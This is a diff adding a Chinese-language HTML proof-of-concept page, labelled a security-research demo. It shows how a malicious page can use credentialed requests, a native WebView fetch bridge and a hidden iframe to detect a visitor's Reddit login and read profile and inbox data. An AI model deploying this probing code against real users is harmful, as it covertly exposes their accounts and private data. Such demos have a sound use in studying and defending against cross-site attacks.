@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>钓鱼网站登录状态检测演示</title>
+  <style>
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      padding: 20px;
+      max-width: 1200px;
+      margin: 0 auto;
+      background: #1a1a1a;
+      color: #e0e0e0;
+    }
+    .card {
+      background: #2d2d2d;
+      border-radius: 8px;
+      padding: 20px;
+      margin: 20px 0;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+    }
+    h1 { color: #ff6b6b; }
+    h2 { color: #4ecdc4; margin-top: 0; }
+    button {
+      background: #ff6b6b;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin: 5px;
+      font-size: 14px;
+      font-weight: bold;
+    }
+    button:hover { background: #ff5252; }
+    button.success { background: #51cf66; }
+    button.success:hover { background: #40c057; }
+    .result {
+      background: #1e1e1e;
+      border-left: 4px solid #ff6b6b;
+      padding: 15px;
+      margin: 10px 0;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      white-space: pre-wrap;
+      word-break: break-all;
+      font-size: 12px;
+    }
+    .result.success { border-left-color: #51cf66; }
+    .result.warning { border-left-color: #ffd43b; }
+    .result.error { border-left-color: #ff6b6b; }
+    iframe {
+      width: 100%;
+      height: 0;
+      border: none;
+      display: none;
+    }
+    .warning-box {
+      background: #ffd43b;
+      color: #000;
+      padding: 15px;
+      border-radius: 4px;
+      margin: 20px 0;
+      font-weight: bold;
+    }
+    .api-endpoint {
+      background: #3d3d3d;
+      padding: 10px;
+      margin: 5px 0;
+      border-radius: 4px;
+      font-family: monospace;
+      font-size: 12px;
+    }
+    .status-indicator {
+      display: inline-block;
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      margin-right: 8px;
+    }
+    .status-indicator.logged-in { background: #51cf66; }
+    .status-indicator.not-logged-in { background: #ff6b6b; }
+    .status-indicator.unknown { background: #ffd43b; }
+  </style>
+</head>
+<body>
+  <h1>🎣 钓鱼网站登录状态检测演示</h1>
+  <p>演示恶意网页如何通过后台iframe检测用户登录状态</p>
+
+  <div class="warning-box">
+    ⚠️ 这是安全研究演示工具，用于展示钓鱼网站的攻击原理。请勿用于非法用途。
+  </div>
+
+  <div class="card">
+    <h2>📋 攻击场景说明</h2>
+    <p><strong>钓鱼网站的攻击步骤：</strong></p>
+    <ol>
+      <li>用户在正常网站（如Reddit）登录</li>
+      <li>用户访问恶意网页（钓鱼网站）</li>
+      <li>恶意网页在后台加载iframe（用户看不到）</li>
+      <li>通过多个API端点检测用户登录状态</li>
+      <li>即使用户看不到，也能检测到登录状态</li>
+    </ol>
+  </div>
+
+  <div class="card">
+    <h2>🔍 多端点检测登录状态</h2>
+    <p>尝试多个Reddit API端点，提高检测成功率：</p>
+    <button onclick="detectLoginStatusMultiEndpoint()">开始检测（多端点）</button>
+    <button onclick="detectLoginStatusWithIframe()" class="success">模拟钓鱼攻击（后台iframe）</button>
+    <div id="detectionResult" class="result" style="display:none;"></div>
+  </div>
+
+  <div class="card">
+    <h2>📊 检测结果详情</h2>
+    <div id="detailedResults"></div>
+  </div>
+
+  <!-- 隐藏的iframe，模拟后台加载 -->
+  <iframe id="hiddenRedditFrame" src="about:blank"></iframe>
+
+  <script>
+    // Reddit API端点列表（按优先级排序）
+    const REDDIT_API_ENDPOINTS = [
+      {
+        url: 'https://oauth.reddit.com/api/v1/me',
+        name: 'OAuth API - /api/v1/me',
+        description: '标准用户信息API，但未登录时也返回features'
+      },
+      {
+        url: 'https://www.reddit.com/api/v1/me',
+        name: 'Main API - /api/v1/me',
+        description: '主站API端点'
+      },
+      {
+        url: 'https://www.reddit.com/user/me.json',
+        name: 'User Profile - /user/me.json',
+        description: '用户资料JSON端点'
+      },
+      {
+        url: 'https://www.reddit.com/user/me/about.json',
+        name: 'User About - /user/me/about.json',
+        description: '用户about信息'
+      },
+      {
+        url: 'https://www.reddit.com/message/inbox.json',
+        name: 'Inbox - /message/inbox.json',
+        description: '收件箱（需要登录）'
+      },
+      {
+        url: 'https://www.reddit.com/prefs/blocked.json',
+        name: 'Blocked Users - /prefs/blocked.json',
+        description: '屏蔽用户列表（需要登录）'
+      },
+      {
+        url: 'https://old.reddit.com/api/me.json',
+        name: 'Old Reddit - /api/me.json',
+        description: '旧版Reddit API'
+      }
+    ];
+
+    async function detectLoginStatusMultiEndpoint() {
+      const resultDiv = document.getElementById('detectionResult');
+      const detailedDiv = document.getElementById('detailedResults');
+      
+      resultDiv.style.display = 'block';
+      resultDiv.textContent = '⏳ 正在检测多个API端点...';
+      resultDiv.className = 'result warning';
+      
+      detailedDiv.innerHTML = '<h3>检测进度：</h3>';
+      
+      const results = [];
+      let loggedInCount = 0;
+      let notLoggedInCount = 0;
+      
+      for (const endpoint of REDDIT_API_ENDPOINTS) {
+        const endpointDiv = document.createElement('div');
+        endpointDiv.className = 'api-endpoint';
+        endpointDiv.innerHTML = `<span class="status-indicator unknown"></span> 正在检测: ${endpoint.name}...`;
+        detailedDiv.appendChild(endpointDiv);
+        
+        try {
+          const result = await testEndpoint(endpoint);
+          results.push(result);
+          
+          if (result.loggedIn) {
+            loggedInCount++;
+            endpointDiv.innerHTML = `<span class="status-indicator logged-in"></span> <strong>✅ 已登录</strong>: ${endpoint.name}<br><small>${result.reason}</small>`;
+            endpointDiv.style.background = '#2d4a2d';
+          } else {
+            notLoggedInCount++;
+            endpointDiv.innerHTML = `<span class="status-indicator not-logged-in"></span> <strong>❌ 未登录</strong>: ${endpoint.name}<br><small>${result.reason}</small>`;
+            endpointDiv.style.background = '#4a2d2d';
+          }
+        } catch(e) {
+          endpointDiv.innerHTML = `<span class="status-indicator unknown"></span> <strong>⚠️ 错误</strong>: ${endpoint.name}<br><small>${e.message}</small>`;
+          endpointDiv.style.background = '#4a4a2d';
+        }
+      }
+      
+      // 总结
+      const summary = {
+        total: REDDIT_API_ENDPOINTS.length,
+        loggedIn: loggedInCount,
+        notLoggedIn: notLoggedInCount,
+        conclusion: loggedInCount > 0 ? '✅ 检测到登录状态！' : '❌ 未检测到登录状态'
+      };
+      
+      resultDiv.textContent = JSON.stringify(summary, null, 2);
+      resultDiv.className = loggedInCount > 0 ? 'result success' : 'result error';
+      
+      // 添加详细结果
+      const summaryDiv = document.createElement('div');
+      summaryDiv.className = 'api-endpoint';
+      summaryDiv.style.background = loggedInCount > 0 ? '#2d4a2d' : '#4a2d2d';
+      summaryDiv.innerHTML = `<h3>检测总结：</h3>
+        <p>总共检测 ${summary.total} 个端点</p>
+        <p>✅ 显示已登录: ${summary.loggedIn} 个</p>
+        <p>❌ 显示未登录: ${summary.notLoggedIn} 个</p>
+        <p><strong>${summary.conclusion}</strong></p>
+        <p><small>💡 提示：如果至少有一个端点显示已登录，说明用户已登录Reddit</p>`;
+      detailedDiv.appendChild(summaryDiv);
+    }
+
+    async function testEndpoint(endpoint) {
+      let response = null;
+      let responseBody = '';
+      
+      // 优先使用Bridge
+      if (typeof window.TXWebKitNativeFetch === 'function') {
+        try {
+          response = await Promise.race([
+            Promise.resolve(window.TXWebKitNativeFetch(endpoint.url)),
+            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
+          ]);
+        } catch(e) {
+          console.error('Bridge failed:', e);
+        }
+      }
+      
+      // 如果Bridge不可用，使用fetch
+      if (!response) {
+        try {
+          response = await Promise.race([
+            fetch(endpoint.url, { 
+              mode: 'cors', 
+              credentials: 'include', 
+              cache: 'no-store' 
+            }),
+            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
+          ]);
+        } catch(e) {
+          throw new Error('请求失败: ' + e.message);
+        }
+      }
+      
+      const status = response ? (response.status || response.statusCode || 0) : 0;
+      
+      if (status === 0) {
+        return { loggedIn: false, reason: '请求失败或超时', endpoint: endpoint.name };
+      }
+      
+      // 提取响应体
+      try {
+        if (typeof response.text === 'function') {
+          responseBody = await response.text();
+        } else if (typeof response.body === 'string') {
+          responseBody = response.body;
+        } else if (response.data) {
+          responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
+        }
+      } catch(e) {
+        return { loggedIn: false, reason: '无法读取响应体: ' + e.message, endpoint: endpoint.name };
+      }
+      
+      // 分析响应
+      if (status === 401 || status === 403) {
+        return { loggedIn: false, reason: `状态码 ${status} (未授权)`, endpoint: endpoint.name };
+      }
+      
+      if (status === 200) {
+        try {
+          const jsonData = JSON.parse(responseBody);
+          
+          // 检查用户标识字段
+          const hasUserData = jsonData.name || jsonData.id || jsonData.username || 
+                             jsonData.karma || jsonData.created_utc ||
+                             (jsonData.data && (jsonData.data.name || jsonData.data.id));
+          
+          // 特殊处理：某些端点返回的数据结构不同
+          if (jsonData.data && Array.isArray(jsonData.data.children)) {
+            // 这是列表类型的响应（如inbox）
+            return { loggedIn: true, reason: '检测到数据列表（需要登录）', endpoint: endpoint.name, userData: jsonData.data };
+          }
+          
+          if (hasUserData) {
+            return { 
+              loggedIn: true, 
+              reason: '检测到用户数据: ' + (jsonData.name || jsonData.id || '有用户标识'),
+              endpoint: endpoint.name,
+              userData: { name: jsonData.name, id: jsonData.id, karma: jsonData.karma }
+            };
+          }
+          
+          // 检查是否是错误响应
+          if (jsonData.error || jsonData.message) {
+            return { loggedIn: false, reason: 'API返回错误: ' + (jsonData.error || jsonData.message), endpoint: endpoint.name };
+          }
+          
+          // 如果只有features，可能是未登录
+          if (jsonData.features && !hasUserData) {
+            return { loggedIn: false, reason: '只有features，无用户数据（未登录）', endpoint: endpoint.name };
+          }
+          
+          return { loggedIn: false, reason: '状态码200但无用户数据', endpoint: endpoint.name };
+        } catch(e) {
+          // 不是JSON，检查是否是HTML错误页面
+          if (responseBody.includes('403') || responseBody.includes('Forbidden')) {
+            return { loggedIn: false, reason: '403 Forbidden（未授权）', endpoint: endpoint.name };
+          }
+          return { loggedIn: false, reason: '无法解析响应: ' + e.message, endpoint: endpoint.name };
+        }
+      }
+      
+      return { loggedIn: false, reason: `状态码: ${status}`, endpoint: endpoint.name };
+    }
+
+    async function detectLoginStatusWithIframe() {
+      const resultDiv = document.getElementById('detectionResult');
+      const detailedDiv = document.getElementById('detailedResults');
+      
+      resultDiv.style.display = 'block';
+      resultDiv.textContent = '🎣 模拟钓鱼攻击：在后台加载iframe...';
+      resultDiv.className = 'result warning';
+      
+      detailedDiv.innerHTML = '<h3>攻击步骤：</h3>';
+      
+      // 步骤1：在后台加载iframe（用户看不到）
+      const iframe = document.getElementById('hiddenRedditFrame');
+      iframe.src = 'https://www.reddit.com';
+      
+      const step1 = document.createElement('div');
+      step1.className = 'api-endpoint';
+      step1.innerHTML = '1️⃣ 在后台加载Reddit iframe（用户看不到）...';
+      detailedDiv.appendChild(step1);
+      
+      // 等待iframe加载
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      
+      step1.innerHTML = '1️⃣ ✅ iframe已加载（用户看不到）';
+      step1.style.background = '#2d4a2d';
+      
+      // 步骤2：通过多个API端点检测登录状态
+      const step2 = document.createElement('div');
+      step2.className = 'api-endpoint';
+      step2.innerHTML = '2️⃣ 通过多个API端点检测登录状态...';
+      detailedDiv.appendChild(step2);
+      
+      const results = [];
+      let loggedInCount = 0;
+      
+      for (const endpoint of REDDIT_API_ENDPOINTS.slice(0, 5)) { // 只检测前5个，加快速度
+        try {
+          const result = await testEndpoint(endpoint);
+          results.push(result);
+          if (result.loggedIn) loggedInCount++;
+        } catch(e) {
+          console.error('检测失败:', e);
+        }
+      }
+      
+      step2.innerHTML = `2️⃣ ✅ 检测完成，${loggedInCount} 个端点显示已登录`;
+      step2.style.background = loggedInCount > 0 ? '#2d4a2d' : '#4a2d2d';
+      
+      // 步骤3：显示攻击结果
+      const step3 = document.createElement('div');
+      step3.className = 'api-endpoint';
+      step3.style.background = loggedInCount > 0 ? '#ff6b6b' : '#4a2d2d';
+      step3.innerHTML = `<h3>🎣 攻击结果：</h3>
+        <p><strong>${loggedInCount > 0 ? '✅ 成功检测到用户已登录Reddit！' : '❌ 未检测到登录状态'}</strong></p>
+        <p>即使用户看不到iframe，恶意网页也能检测到登录状态</p>
+        <p><small>💡 这就是钓鱼网站的攻击原理：后台检测，用户无感知</small></p>`;
+      detailedDiv.appendChild(step3);
+      
+      resultDiv.textContent = JSON.stringify({
+        attack: '钓鱼网站登录状态检测',
+        method: '后台iframe + 多端点API检测',
+        result: loggedInCount > 0 ? '成功检测到登录状态' : '未检测到登录状态',
+        endpointsTested: results.length,
+        loggedInEndpoints: loggedInCount
+      }, null, 2);
+      resultDiv.className = loggedInCount > 0 ? 'result success' : 'result error';
+    }
+  </script>
+</body>
+</html>
+
